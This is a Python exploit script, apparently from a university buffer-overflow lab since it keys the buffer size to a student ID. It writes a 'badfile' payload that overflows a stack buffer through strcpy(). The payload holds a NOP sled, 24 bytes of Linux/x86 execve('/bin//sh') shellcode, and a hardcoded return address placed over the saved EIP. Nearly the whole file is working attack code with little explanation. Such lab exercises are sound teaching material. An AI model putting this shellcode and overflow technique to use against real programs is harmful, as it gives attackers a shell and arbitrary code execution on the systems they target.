#!/usr/bin/python3

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder="little", signed=False)


# 24-byte Linux/x86 execve("/bin//sh", ...) shellcode
shellcode = (
    "\x31\xc0"
    "\x50"
    "\x68" "//sh"
    "\x68" "/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode("latin-1")


student_id = 4

buf_sz = 100 + student_id
read_sz = buf_sz + 300

# Fill the payload with NOP instructions.
content = bytearray([0x90] * read_sz)

# fread() does not append '\0', but strcpy() requires one.
# Reserve the final byte as the string terminator.
content[-1] = 0x00

# Put the shellcode immediately before the terminating NUL.
start = read_sz - 1 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# These two values must come from this exact compiled binary.
buffer_address = 0xffffd2a8
return_address_offset = 116

# Must be after the overwritten saved return address and before
# the shellcode.
landing_offset = 200

ret = buffer_address + landing_offset
packed_ret = p32(ret)

# Sanity checks
assert len(shellcode) == 24
assert len(content) == read_sz
assert return_address_offset + 4 <= landing_offset < start
assert b"\x00" not in packed_ret, (
    "Return address contains a NUL byte; strcpy() will stop early"
)

# Overwrite saved EIP.
content[return_address_offset:(return_address_offset + 4)] = packed_ret

with open("badfile", "wb") as f:
    f.write(content)

print(f"Payload size:       {len(content)}")
print(f"Shellcode length:   {len(shellcode)}")
print(f"Shellcode offset:   {start}")
print(f"Saved EIP offset:   {return_address_offset}")
print(f"Landing offset:     {landing_offset}")
print(f"Return address:     0x{ret:08x}")
print(f"Return bytes:       {packed_ret.hex()}")
print("badfile generated successfully")
